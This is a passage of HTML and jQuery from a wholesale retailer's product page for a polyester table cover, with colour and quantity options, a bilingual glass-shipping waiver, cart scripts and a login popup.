                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                            <option value="108">108 (9 cases)</option>
                                                            <option value="120">120 (10 cases)</option>
                                                            <option value="132">132 (11 cases)</option>
                                                            <option value="144">144 (12 cases)</option>
                                                            <option value="156">156 (13 cases)</option>
                                                            <option value="168">168 (14 cases)</option>
                                                            <option value="180">180 (15 cases)</option>
                                                            <option value="192">192 (16 cases)</option>
                                                            <option value="204">204 (17 cases)</option>
                                                            <option value="216">216 (18 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-25" name="request_qty[38-0026TQ]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_26" style="display:none;">38-0026YE</span>
                                                <span id="pr_series_image_26" style="display:none;">https://portofino.azureedge.net/38-0026YE.jpg</span>
                                                <span id="pr_series_upc_26" style="display:none;">745910743363</span>
                                                <span id="pr_series_case_price_26" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_26" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_26" style="display:none;"></span>
                                                <span id="pr_series_discount_2_26" style="display:none;"></span>
                                                <span id="pr_series_availability_26" style="display:none;">7 Cases and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color-last" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(26);">
                                                        <img src="uploads/palette/20140523040517ye.jpg" width="31">&nbsp;(YE) Yellow										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026YE">
                                                        <input type="hidden" name="item_name[38-0026YE]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Yellow">
                                                        <input type="hidden" name="item_image[38-0026YE]" value="https://portofino.azureedge.net/38-0026YE.jpg">
                                                        <input type="hidden" name="item_class[38-0026YE]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026YE]" value="745910743363">
                                                        <input type="hidden" name="color[38-0026YE]" value="YE">
                                                        <input type="hidden" name="discount[38-0026YE]" value="">
                                                        <input type="hidden" name="discount_2[38-0026YE]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026YE]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026YE]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026YE]" value="">
                                                        <input type="hidden" name="isSale[38-0026YE]" value="0">
                                                        <input type="hidden" name="isNew[38-0026YE]" value="">
                                                        <input type="hidden" name="isBack[38-0026YE]" value="Y">
                                                        <select class="item_total_qty" id="color-total-26" name="total_qty[38-0026YE]" onchange="moreQty(this.value, '84','38-0026YE',26);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-26" name="request_qty[38-0026YE]" value="0">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="float-right">
                                                <input type="hidden" name="item_number" value="38-0026AQ"> <!-- added by jfp on 11042021 to add item number in updating item quantity -->
                                                <input type="hidden" id="case_qty" name="case_qty" value="12">
                                                <input type="hidden" id="inner_qty" name="inner_qty" value="12">
                                                <input type="hidden" name="case_price" value="8.95">
                                                <input type="hidden" name="unit_price" value="9.95">
                                                <input type="hidden" name="cid" value="0">
                                                <input type="hidden" name="caseWeight" value="34">
                                                <input type="hidden" name="caseLength" value="17.5">
                                                <input type="hidden" name="caseWidth" value="13.5">
                                                <input type="hidden" name="caseHeight" value="13">
                                                <input type="hidden" name="caseVolume" value="1.78">
                                                <input type="hidden" name="unitWeight" value="3.26">
                                                <input type="hidden" name="unitLength" value="0">
                                                <input type="hidden" name="unitWidth" value="0">
                                                <input type="hidden" name="unitHeight" value="0">
                                                <input type="hidden" name="unitVolume" value="0.17">
                                                <input type="button" id="btnSubmit" class="btn btn-primary btn-cart-submit-button fontMontserrat" style="font-weight:bold;" value="ADD TO CART">
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <!--onclick="assignValue(0,document.getElementById('color-qty-0').value,this.value,12);"	-->		
                            </div>
                            <div class="clearfix"></div>
                        </div>
                        <!-- ADD TO CART + DESCRIPTION + VIDEO -->
                        <div class="panel-title title-medium align-left fontMontserrat" style="font-size:15px;">
                            DESCRIPTION
                        </div>
                        <div class="clearfix"></div>
                        <hr class="panel-divider">
                        <div class="product-description-container">
                            <div class="description-text" style="font-size:13px; line-height:20px;">
                                <p>Our Polyester Table Covers can be reused again and again easily for any and all occasions. Available in various sizes for any table. Pair them with our overlays to create different looks for any event.</p>
                                <p><i> Care Intructions: Hand wash recommended. Hang dry: Do not use dryer. If ironing is needed, use a moderately warm iron.</i></p>
                                <p></p>
                            </div>
                            <div class="clearfix"></div>
                        </div>
                        <div align="right">
                            <a href="#" class="cta-back-to-top float-right" style="margin-top:5px;">BACK TO TOP</a>
                        </div>
                        <div class="modal fade" id="glassModal" tabindex="-1" role="dialog" aria-labelledby="glassModalLabel" aria-hidden="true" style="z-index:19999 !important; margin:0px; overflow:hidden;" align="center">
                            <div class="modal-dialog" style="border-radius: 0 !important; padding:0; width:650px; height:570px;margin:0;">
                                <div class="modal-content" style="border-radius: 0 !important; padding:0; width:650px; height:570px;margin:0;">
                                    <div class="modal-body" style="width:650px; height:570px;margin:0; padding:0;">
                                        <img src="images/x.png" align="right" data-dismiss="modal" aria-hidden="true" style="cursor:pointer; margin-top:10px; margin-right:10px;" width="24" height="24">
                                        <div align="center" style="margin-top:5px;"><img src="images/pit-logo-small.jpg" border="0" width="378"></div>
                                        <div align="left" style="padding:15px;">
                                            <span id="glass_text_en">
                                            Dear Customer,<br><br>
                                            This disclosure is to confirm Portofino International Trading USA, Inc. (here after referred to as “Portofino”) shipping policy for any glass items, is to only provide them in prepackaged boxes and that all orders including glass items will only be shipped on pallets of 20 cases of product or more. This is done to insure that the movement of such items to your destination is as safe as possible. Experience has taught us that glass items do not survive well in shipment unless we attempt to limit the handling of such items. Should you elect to “Agree” to the this responsibility waiver, you acknowledge that Portofino does not have any  responsibility for broken glass items if the shipping method deviates from Portofino Policy. Portofino will take every precaution it can reasonably take to insure the items are protected but will not repack or ship any glass items in quantities less than standard factory packaging. By checking the “I Agree” box, you acknowledge that Portofino has no responsibility if any of our glass items shipped to you are received damaged. That your options are to identify the damage prior to the carrier leaving your business after delivery and if there is damage, acquiring the delivery agents signature acknowledging the damage, and submitting a claim with the carrier or accepting the damaged glass items for which you may dispose of them by any means you choose.<br><br>
                                            I AGREE By checking this box with my order, I hereby accept full responsibility for any glass items received damaged from Portofino due to my decision to require Portofino to ship requested items in a manner different than Portofino’s shipping policy, as stated above in this disclosure. I further acknowledge that this waiver will be in effect until I request it be changed. 
                                            <br><br>
                                            <a href="#glass_policy" id="glass_translate_sp" style="color:#004C84; font-weight:bold;">En Español</a>
                                            </span>
                                            <span id="glass_text_sp" style="display:none;">
                                            Estimado cliente,<br><br>
                                            Esta divulgación es para confirmar que Portofino International Trading EE.UU., Inc. (aquí en adelante como "Portofino") política de envío de cualquier artículo de vidrio es solo para proporcionar es cajas pre envasados y que todas la ordenes que incluyen artículos de vidrio serán enviados solamente en paletas de 20 cajas o más de producto. Esto se hace para asegurar que hay poco o ningún movimiento mientras que llega a su destino final.  La experiencia nos ha enseñado que los artículos de vidrio no sobreviven bien en el envío a menos que intentemos limitar el tratamiento de dichos envíos. En caso de optar de la renuncia de responsabilidad a continuación, por marcando la casilla usted reconoce que Portofino no tiene ninguna responsabilidad de los artículos de vidrio dañado o quebrado si el método de envío se desvía de la Política de Portofino. Portofino tomará todas las precauciones razonables que puede tomar para asegurar los bienes están protegidos, pero no vuelva a embalar o enviar ningún artículo de vidrio en cantidades menores de empaquetado de la fábrica estándar. Al marcar la casilla "Estoy de acuerdo", reconoce que Portofino no tiene ninguna responsabilidad si alguno de nuestros artículos de vidrio enviados a usted se reciben dañado. Que sus opciones son identificar los daños antes de la portadora de salir de su negocio después del parto y si hay daños, la adquisición de la firma agentes de entrega reconociendo el daño, y la presentación de una reclamación al transportista o aceptar los artículos de vidrio dañados en los que puede disponer de ellos por cualquier medio que elija.<br><br>
                                            ACEPTO Al marcar esta casilla con mi pedido, la presente acepto toda la responsabilidad por ningún artículo de vidrio recibidas dañado de Portofino debido a mi decisión de exigir Portofino a enviar artículos solicitados de una manera diferente a la política de política de envíos de Portofino, como se ha indicado anteriormente en esta descripción. Además, acepto que esta renuncia estará en efecto hasta que solicite una modificación.<br><br>
                                            <a href="#glass_policy" id="glass_translate_en" style="color:#004C84; font-weight:bold;">In English</a>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <span id="item_ctr" style="display:none;"></span>
                        <span id="order_request_item_id" style="display:none;"></span>
                        <span id="cart_item_qty" style="display:none;"></span>
                        <div class="modal fade" id="moreQtyModal" tabindex="-1" role="dialog" aria-labelledby="moreQtyModalLabel" aria-hidden="true" style="z-index:19999 !important; margin:0px; overflow:hidden;" align="center">
                            <div class="modal-dialog" style="border-radius: 0 !important; padding:0; width:450px; height:200px;margin:0;">
                                <div class="modal-content" style="border-radius: 0 !important; padding:0; width:450px; height:200px;margin:0;">
                                    <div class="modal-body" style="width:450px; height:200px;margin:0; padding:0;">
                                        <div align="center">
                                            <div align="center" style="font-size:15px; font-weight:bold;">
                                                <br>
                                                Would you like to add the available <span id="available_stocks"></span> stocks to your cart<br>
                                                and send an order request for <input name="request_qty" id="request_qty" type="text" size="5" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" style="height:25px; font-weight:bold; font-size:15px;"> quantity?
                                                <br><br>Note: Item and order request will be sent after you click <br>"ADD TO CART" button.
                                                <br><br><input type="button" value="YES" onclick="yesMoreQty();">&nbsp;&nbsp;<input type="button" value="CANCEL" onclick="cancelMoreQty();">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <script>
                            function moreQty(isMoreQty, stocks, item_no, item_ctr) {
                                if (isMoreQty=="more") {
                                    $('#order_request_item_id').html(item_no);
                                    $('#item_ctr').html(item_ctr);
                                    $('#cart_item_qty').html(stocks);
                                    $('#available_stocks').html(stocks);
                                    $('#request_qty').val(0);
                                    $('#moreQtyModal').modal('show');
                                } else {
                                    $('#color-request-'+item_ctr).val(0);
                                    $('#order_request_item_id').html(0);
                                    $('#cart_item_qty').html(0);
                                    $('#item_ctr').html("");
                                    $('#request_qty').val(0);
                                }
                            }
                            
                            function cancelMoreQty() {
                                    var item_id = $('#order_request_item_id').text();
                                    var item_ctr = $('#item_ctr').text();
                                    
                                    $('#color-total-'+item_ctr).val("");
                                    $('#color-request-'+item_ctr).val(0);
                                    $('#order_request_item_id').html(0);
                                    $('#cart_item_qty').html(0);
                                    $('#item_ctr').html("");
                                    $('#request_qty').val(0);
                                    $('#moreQtyModal').modal('hide');
                            }
                            
                            function yesMoreQty() {
                                    var item_id = $('#order_request_item_id').text();
                                    var item_ctr = $('#item_ctr').text();
                                    
                                    $('#color-request-'+item_ctr).val($('#request_qty').val());
                                    $('#color-total-'+item_ctr).val($('#cart_item_qty').text());
                                    
                                    //addToCart(item_id);
                                    
                                    $('#order_request_item_id').html(0);
                                    $('#cart_item_qty').html(0);
                                    $('#item_ctr').html("");
                                    $('#request_qty').val(0);
                                    $('#moreQtyModal').modal('hide');
                            }							
                                                            $(function(){
                                                                
                                                            $('#moreQtyModal').on('hidden.bs.modal', function () {
                                                                
                                                                cancelMoreQty();
                                                            });
                                                                
                            
                                                            var timer = null;
                                                            
                                                                $('.case-total-qty-text').keyup(function(event){
                                                                    clearTimeout(timer); 
                                                                    str_id = event.target.id;
                                                                    array_id = str_id.split('-');
                                                                    field_id = array_id[(array_id.length-1)];
                                                                    total_qty_val = $(this).val();
                                                                    total_case = $("#color-case-"+field_id).val();
                                                                    total_inner = $("#color-qty-"+field_id).val();  
                                                                    
                                                                    //alert ($(this).val());
                                                                    timer = setTimeout(function() { computeInnerAndCaseQty(field_id, total_case, total_inner,$("#case_qty").val(),'12',0); }, 1000);
                                                                    
                                                                });
                                                                
                                                                $("#glass_translate_sp").click(function () {
                                                                    $("#glass_text_sp").show();
                                                                    $("#glass_text_en").hide();
                                                                });
                                                                $("#glass_translate_en").click(function () {
                                                                    $("#glass_text_en").show();
                                                                    $("#glass_text_sp").hide();
                                                                });
                                                                
                                                                
                                                                $("#glass_policy").click(function () {
                                                                    $('#glassModal').modal('show');
                                                                });
                                                                
                                                                $("#btnSubmit").keypress(function (e) {
                                                                var key = e.which;
                                                                    if(key == 13)  // the enter key code
                                                                        {
                                                                            $("#btnSubmit").trigger('click');
                                                                        }
                                                                });
                                                                
                                                                $("#btnSubmit").click(function () {
                                                                    
                                                                    var is_with_qty = 2;
                                                                    
                                                                    $(".item_total_qty").each(function() {
                                                                            //var str_id = this.id;
                                                                            //var array_id = str_id.split('-');
                                                                            //var field_id = array_id[(array_id.length-1)];
                                                                            //var temp_item_no = $(this).val().replace("/","");
                                                                            var total_qty = $(this).val();
                                                                            if (total_qty>0) {
                                                                                is_with_qty = 1;
                                                                                return false;
                                                                            }
                                                                            
                                                                        
                                                                    });
                                                                    
                                                                        
                                                                    
                                                                        
                                                                                    if (is_with_qty<1) {
                                                                                        var error_message = '<br><span style="font-weight:bold;">Please select order quantity.</span>';
                                                                                        
                                                                                        $("#inventory_error").html("<br><br>"+error_message);
                                                                                        window.location.hash = "#inventory_error";
                                                                                    } else {
                                                                                        $("#inventory_error").html("");
                                                                                        $("#cart-order-form").submit();
                                                                                    }
                                                                                        
                                                                        
                                                                    });
                                                                
                                                                
                            
                                                            });
                                                        
                        </script>
                    </div>
                    <!-- end.top content -->
                    <!-- end.rightpanel -->
                </div>
                <div class="clearfix"></div>
                <div style="margin-top:50px;" class="noprint"><a href="content.php?pgID=31#priceguaranteepolicy"><img src="images/blrb20160202110641web_banner_r.png" border="0" width="717" height="110"></a></div>
                <div class="clearfix">&nbsp;</div>
                <!-- END.container -->
            </div>
            <div class="container ">
                <!-- start.container -->
            </div>
            <!-- PANEL -->
            <div id="footer-container-social-links" class="panel-row" style="margin-bottom:60px; width:905px;">
                <p><a class="icon-social" href="http://www.facebook.com/portofinointl" id="Facebook" style="line-height: 20.8px;" target="_blank"><img alt="Facebook" src="/uploads/image/2017-37px_FB.jpg" style="height:37px; margin-left:2px; margin-right:2px; width:37px"></a><a href="https://www.instagram.com/portofinointernational/" style="line-height: 20.8px;" target="_blank"><img alt="Instagram" src="/uploads/image/2017-37px_insta.jpg" style="height:37px; margin-left:2px; margin-right:2px; width:37px"></a>&nbsp;<a href="https://www.pinterest.com/portofinointltr/" style="line-height: 20.8px;" target="_blank"><img alt="pinterest" src="/uploads/image/2017-37px_pin.jpg" style="height:37px; margin-left:2px; margin-right:2px; width:37px"></a>&nbsp;&nbsp;<a href="https://plus.google.com/+Portofinointl/posts" style="line-height: 20.8px;" target="_blank"><img alt="Google +" src="/uploads/image/2017-37px_Google.jpg" style="height:37px; margin-left:2px; margin-right:2px; width:37px"></a>&nbsp;&nbsp;<a href="https://twitter.com/PortofinoIntl" style="line-height: 20.8px;" target="_blank"><img alt="" src="/uploads/image/2017-37px_twitter.jpg" style="height:37px; margin-left:2px; margin-right:2px; width:37px"></a></p>
            </div>
            <div id="social-media-soon-box" class="coming-soon-box">Coming Soon</div>
            <!-- PANEL -->
            <div style="text-align: center;" class="noprint"><a href="/feedback_form.php"><button class="outline_button_black">We want your feedback!</button></a></div>
            <div id="footer-container-quick-links" class="panel-row" style=" width:905px;">
                <ul class="quick-links-footer-title-items noprint" style="margin:0;">
                    <li class="first" style="vertical-align: -webkit-baseline-middle; "><span style="font-weight:900;">SHOP</span></li>
                    <li style="vertical-align: -webkit-baseline-middle; width:234px;"><span style="font-weight:900;">ABOUT US</span></li>
                    <li style="vertical-align: -webkit-baseline-middle; width:215px;"><span style="font-weight:900;">CUSTOMER SERVICE</span></li>
                    <li class="last" style="vertical-align: -webkit-baseline-middle; "><span style="font-weight:900;">MY ACCOUNT</span></li>
                </ul>
                <ul class="quick-links-footer-items noprint" style="margin-top:10px;">
                    <li class="first" style="vertical-align: top; "><a id="footer_14" href="https://www.portofinointl.com/category.php?cl=1&amp;cid=1" class="" style="padding-top:0px;">Baby Shower</a><br><a id="footer_15" href="https://www.portofinointl.com/category.php?cl=1&amp;cid=2" class="">Baptism</a><br><a id="footer_16" href="https://www.portofinointl.com/category.php?cl=1&amp;cid=6" class="">Communion</a><br><a id="footer_17" href="https://www.portofinointl.com/category.php?cl=1&amp;cid=21" class="">Weddings</a><br><a id="footer_18" href="https://www.portofinointl.com/category.php?cl=1&amp;cid=18" class="">Quinceanera</a><br><a id="footer_19" href="https://www.portofinointl.com/category.php?cl=1&amp;cid=17" class="">Party</a><br><a id="footer_20" href="https://www.portofinointl.com/category.php?cl=1&amp;cid=3" class="">Crafts</a><br><a id="footer_21" href="https://www.portofinointl.com/category.php?cl=1&amp;cid=12" class="">Home Decor</a><br></li>
                    <li style="vertical-align: top; width:234px;"><a id="footer_22" href="content.php?pgID=3" class="" style="padding-top:0px;">Our Story</a><br><a id="footer_23" href="content.php?pgID=3" class="">Why Choose Portofino?</a><br><a id="footer_24" href="content.php?pgID=25" class="">Office Hours &amp; Location</a><br><a id="footer_25" href="content.php?pgID=25" class="">Contact Us</a><br></li>
                    <li style="vertical-align: top; width:215px;"><a id="footer_41" href="FAQ" class="" style="padding-top:0px;">FAQ</a><br><a id="footer_27" href="https://issuu.com/portofinoadmin/docs/catalog_2023_web?fr=sODk3MzcyNTAwMQ" class="">Main Catalog</a><br><a id="footer_28" href="catalog" class="">Request a Catalog</a><br></li>
                    <li class="last" style="vertical-align: top; "><a id="footer_29" href="content.php?pgID=31#howtoorder" class="" style="padding-top:0px;">How to Order</a><br><a id="footer_30" href="myprofile.php" class="">My Profile</a><br><a id="footer_44" href="myaddress_book.php" class="">Manage Shipping Address</a><br><a id="footer_39" href="quick_order.php" class="">Quick Order</a><br><a id="footer_31" href="content.php?pgID=31" class="">Terms of Use</a><br><a id="footer_32" href="content.php?pgID=31#securityandprivacy" class="">Security &amp; Privacy</a><br><a id="footer_33" href="content.php?pgID=31#shippingandreturns" class="">Shipping &amp; Returns</a><br><a id="footer_35" href="sitemap.php" class="">Site Map</a><br></li>
                </ul>
                <div id="sitemap-soon-box" class="coming-soon-box" style="margin-left: 724px; margin-top: -13px;">Coming Soon</div>
            </div>
            <!-- PANEL -->
            <div id="footer-container-security-logos" class="panel-row noprint" style="margin-bottom:64px; margin-top:-10px;">
                <p>
                    <a href="#"><img src="/images/elavon-logo.jpg" style="height:33px; width:70px"> </a><img src="/images/security-logo-cc.png" style="height:20px; width:140px">&nbsp;&nbsp;&nbsp;
                    <span id="siteseal">
                        <script type="text/javascript" src="https://seal.godaddy.com/getSeal?sealID=3Nw1CjH2BzKbhrXWuAiDEWwJkqjxdI8SNpJpHVmTSsC0usbVOrK02lkc8r"></script><img style="cursor:pointer;cursor:hand" src="https://seal.godaddy.com/images/3/en/siteseal_gd_3_h_l_m.gif" onclick="verifySeal();" alt="SSL site seal - click to verify">
                    </span>
                    <br>
                    Copyright © 2024 Portofino International Trading USA, Inc. All rights reserved.
                </p>
            </div>
            <!-- END.container -->
        </div>
        <script src="js/vendor/bootstrap.min.js"></script>
        <script src="js/main.js"></script>
        <script>
            var zoomConfig = {zoomWindowFadeIn: 500,
                    zoomWindowFadeOut: 750,
                    zoomWindowWidth:360,
                    zoomWindowHeight:360,
                    constrainType:"height", 
                    constrainSize:274, 
                    borderSize:1,
                    containLensZoom: true, 
                    gallery:'palette-images-selection', 
                    cursor: 'pointer', 
                    galleryActiveClass: "active"};
                    
            function DoToAll(obj_input)
                { 	bol_is_checked = (obj_input.checked)?true:false
                    for (x=0;x<obj_input.form.length;x++)
                    {  obj_input.form.elements[x].checked = bol_is_checked;
                    }
                }
                    $(function(){
            
                
                
            
                //thumbnail_item = $('.details-image .palette-images .palette-item');
                //product_image  = $('#product-selected-image > img');
                product_active_image = $('#product-image-file');
                    
                product_active_image.elevateZoom(zoomConfig); 
            
                product_active_image.bind("click", function(e) {  
                    var ez =   product_active_image.data('elevateZoom');
                    ez.closeAll(); 
                    return false;
                });          
                
                $('#datetimepicker6').datetimepicker({
                        icons: {
                            date: "fa fa-calendar",
                        },
                pickTime: false
                    });
            
                $('#slides').slidesjs({
                    width: 720,
                    height: 400,
                    navigation: {
                    active: false
                    },
                    play: {
                    active: false,
                    auto: true,
                    interval: 4000,
                    swap: false
                    }
                });
            
                $('#slides-small').slidesjs({
                    width: 234,
                    height: 270,
                    navigation: {
                    active: false
                    },
                    play: {
                    active: false,
                    auto: true,
                    interval: 4000,
                    swap: false
                    },
                    effect: {
                    fade: {
                        speed: 800
                    }
                    },
                    pagination: {
                    active: false
                    },
                });
                
                
                
                
                $("#search-by-price-soon").mouseover(function () {
                                $("#search-soon-box").css('margin-top','-4px');
                                $("#search-soon-box").css('margin-left','5px');
                                $("#search-soon-box").show();
                        });
                $("#search-by-price-soon").mouseout(function () {
                                $("#search-soon-box").hide();
                        });
                
                $("#search-special-soon").mouseover(function () {
                                $("#search-soon-box").css('margin-top','29px');
                                $("#search-soon-box").css('margin-left','7px');
                                $("#search-soon-box").show();
                        });
                $("#search-special-soon").mouseout(function () {
                                $("#search-soon-box").hide();
                        });
                
                    
                
                
                        
                
                $("#twitter-soon").mouseover(function () {
                                $("#social-media-soon-box").css('margin-top','-135px');
                                $("#social-media-soon-box").css('margin-left','340px');
                                $("#social-media-soon-box").show();
                        });
                $("#twitter-soon").mouseout(function () {
                                $("#social-media-soon-box").hide();
                        });			  
                
                
                $("#blog-soon").mouseover(function () {
                                $("#social-media-soon-box").css('margin-top','-135px');
                                $("#social-media-soon-box").css('margin-left','450px');
                                $("#social-media-soon-box").show();
                        });
                $("#blog-soon").mouseout(function () {
                                $("#social-media-soon-box").hide();
                        });
                
                
                $("#pinterest-soon").mouseover(function () {
                                $("#social-media-soon-box").css('margin-top','-135px');
                                $("#social-media-soon-box").css('margin-left','505px');
                                $("#social-media-soon-box").show();
                        });
                $("#pinterest-soon").mouseout(function () {
                                $("#social-media-soon-box").hide();
                        });
                
                
                $("#instagram-soon").mouseover(function () {
                                $("#social-media-soon-box").css('margin-top','-135px');
                                $("#social-media-soon-box").css('margin-left','560px');
                                $("#social-media-soon-box").show();
                        });
                $("#instagram-soon").mouseout(function () {
                                $("#social-media-soon-box").hide();
                        });
                        
                
                $("#footer_34").mouseover(function () {
                                $("#sitemap-soon-box").css('margin-top','-58px');
                                $("#sitemap-soon-box").css('margin-left','810px');
                                $("#sitemap-soon-box").show();
                        });
                $("#footer_34").mouseout(function () {
                                $("#sitemap-soon-box").hide();
                        });
                
                    
                        
                $("img").on("contextmenu",function(){
                return false;
                }); 	  		  
            
                                
                
                                        var security_question = null;
                                    $('#forgotpassword_email').keyup(function(event){
                                        clearTimeout(security_question); 
                                        //alert ($(this).val());
                                        security_question = setTimeout(getSecurityQuestion($(this).val()), 5000);
                                    });
                                    
                                    
                                    
                
                            $('.modal').on('show.bs.modal', centerModal);
                            $(window).on("resize", function () {
                                $('.modal:visible').each(centerModal);
                            });
            
            
            });
            
                    function centerModal() {
                        $(this).css('display', 'block');
                        var $dialog = $(this).find(".modal-dialog");
                        var offset = ($(window).height() - $dialog.height()) / 2;
                        // Center modal vertically in window
                        if(offset < 0) offset = 0;
                        $dialog.css("top", offset+'px');
                    }
                    
                    
            
            
            
            
                                            function getSecurityQuestion(q) {
                                    $.post("ajax_security_question.php", { email: q},
                                                function(data) {
                                                        if (data!='error') {
                                                        //alert(data);
                                                            $('#security-question-out').html(data);
                                                    $('#security_question').val(data);
                                                    
                                                        } else {
                                                            $('#security-question-out').html("");
                                                        }
                                                });
                                }
                                
                                
                function submitOnEnter(e,submitType, objForm, callFunction) {
                    
                    code = e.keyCode || e.which;
                    
                    if (code == 13) {
                        
                        if (submitType == "submit") {
                            objForm.submit();	
                        } else if (submitType == "call") {
                            callFunction();
                        }
                    } 
                }
            
                
        </script>
        <!-- Google Analytics: change UA-XXXXX-X to be your site's ID. -->
        <!--
            <script>
                (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
                function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
                e=o.createElement(i);r=o.getElementsByTagName(i)[0];
                e.src='//www.google-analytics.com/analytics.js';
                r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
                ga('create','UA-XXXXX-X');ga('send','pageview');
            </script>
            -->
        <!-- Modal -->
        <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="z-index:19999 !important; margin:0px; overflow:hidden;" align="center">
            <div class="modal-dialog" style="border-radius: 0 !important; padding:0; width:540px; height:478px;margin:0;">
                <div class="modal-content" style="border-radius: 0 !important; padding:0; width:540px; height:478px;margin:0;">
                    <div class="modal-body" style="width:540px; height:478px;margin:0; padding:0;background:url(images/login-popup-bg-2.jpg) no-repeat;">
                        <img src="images/x.png" align="right" data-dismiss="modal" aria-hidden="true" style="cursor:pointer; margin-top:10px; margin-right:10px;" width="24" height="24">
                        <div style="margin-left:85px; margin-right:85px; padding-top:18px;">
                            <style type="text/css">
                                input::-webkit-input-placeholder { /* WebKit browsers */
                                font-size:10px;
                                font-family: "Roboto",Arial, Helvetica;
                                font-weight:lighter;
                                }
                                input:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
                                font-size:10px;
                                font-family: "Roboto",Arial, Helvetica;
                                font-weight:lighter;
                                }
                                input::-moz-placeholder { /* Mozilla Firefox 19+ */
                                font-size:10px;
                                font-family: "Roboto",Arial, Helvetica;
                                font-weight:lighter;
                                }
                                input:-ms-input-placeholder { /* Internet Explorer 10+ */
                                font-size:10px;
                                font-family: "Roboto",Arial, Helvetica;
                                font-weight:lighter;
                                }
                                input[type='text'], input[type='password']{
                                padding-left:3px;
                                outline: none;
                                height:20px;
                                border: 1px solid #959595; 
                                font-family: "Roboto",Arial, Helvetica;
                                font-weight:lighter;
                                }
                            </style>
                            <table class="login-register-form-table" border="0" style="margin-top:0; display:block;">
                                <form method="post" name="login_popup" action="https://www.portofinointl.com/process.php"></form>
                                <input type="hidden" name="isFromPopUp" id="isFromPopUp" value="1">
                                <input type="hidden" name="option[]" value="signin">
                                <tbody>
                                    <tr style="padding-top:5px; padding-bottom:5px;">
                                        <td valign="middle" nowrap="nowrap" class="float-left" style="padding-top:5px; padding-bottom:5px;"><span class="txt-16 fontRoboto" style="font-weight:lighter;">PLEASE LOG IN</span>
                                        </td>
                                    </tr>
                                    <tr style="padding-top:5px; padding-bottom:5px;">
                                        <td valign="middle" nowrap="nowrap" class="float-left" style="padding-top:5px; padding-bottom:5px;"><span class="field-label">E-mail Address:</span>
                                            <input type="text" name="email" value="" maxlength="250" style="width:250px;">
                                        </td>
                                    </tr>
                                    <tr>
                                        <td valign="middle" nowrap="nowrap" class="float-left" style="padding-bottom:5px;"><span class="field-label">Password:</span>
                                            <input type="password" placeholder="" name="pwd" value="" maxlength="250" style="width:285px" autocomplete="off">
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="padding-left:100px;">
                                            <input class="btn btn-primary btn-cart-submit-button fontMontserrat btn-login-button" name="btn_submit_login" id="btn_submit_login" type="submit" value="LOG IN" style="width:158px; font-weight:bold; margin-top:5px;">
                                        </td>
                                    </tr>
                                    <tr>
                                        <td align="left" style="padding:0;margin:0;">
                                            <div align="center" class="fontRoboto txt-red txt-11" style="display:table-cell; font-weight:lighter; height:45px;  line-height:11px; width:370px; vertical-align:middle; padding:0px; margin:0px;">
                                                &nbsp;	
                                            </div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="padding-top:0px;">
                                            <span class="txt-13"><strong class="fontMontserrat">FORGOT YOUR PASSWORD?</strong></span>
                                        </td>
                                    </tr>
                                    <form action="/products.php?cid=&amp;pid=38-0026AQ" method="post"></form>
                                    <tr>
                                        <td valign="middle" class="float-left" style="padding-top:5px;"><span class="field-label">E-mail Address:</span>
                                            <input type="text" id="forgotpassword_email" name="forgotpassword_email" value="" maxlength="250" style="width:250px">
                                        </td>
                                    </tr>
                                    <tr>
                                        <td valign="middle" class="float-left" style="padding-top:5px;"><span class="field-label">Security Question:</span>
                                            <input type="hidden" id="security_question" name="security_question" value="">
                                            <span id="security-question-out" class="fontRoboto txt-12" style="font-weight:lighter;"></span>   
                                        </td>
                                    </tr>
                                    <tr>
                                        <td valign="middle" class="float-left" style="padding-top:5px;"><span class="field-label">Security Answer:</span>
                                            <input type="text" name="security_answer" value="" maxlength="250" style="width:238px;">
                                        </td>
                                    </tr>
                                    <tr>
                                        <td align="left" style="padding:0;margin:0;">
                                            <div align="left" class="fontRoboto txt-10" style="display:table-cell; font-weight:lighter; height:45px;  line-height:11px; width:370px; vertical-align:middle; padding-top:8px; margin:0px; color:#999999;">
                                                Please enter your e-mail address and answer the security question correctly and<br> 
                                                your password will be sent to you. Password retrieval may take up to 24hrs. If your<br>
                                                application was never approved, password retrieval is not possible. Accounts that<br>
                                                have had no activity for 180 days will be made inactive &amp; will require contact with<br>
                                                Portofino to reactivate. More than 3 attempts to log in within an hour will result in<br>
                                                an account lockout.
                                            </div>
